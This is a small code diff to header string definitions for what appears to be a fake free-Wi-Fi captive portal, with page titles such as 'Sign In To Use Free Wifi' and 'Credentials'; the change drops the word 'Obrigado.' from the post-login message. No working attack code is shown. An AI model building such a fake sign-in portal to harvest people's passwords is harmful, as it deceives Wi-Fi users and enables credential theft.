@@ -9,7 +9,7 @@
 #define TITLE "Sign In:"
 #define BODY "Sign In To Use Free Wifi"
 #define POST_TITLE "Account Successfully Registered"
-#define POST_BODY "Please wait while you are being connected...</br>Obrigado."
+#define POST_BODY "Please wait while you are being connected...</br>"
 #define PASS_TITLE "Credentials"
 #define CLEAR_TITLE "Turn Off"
  
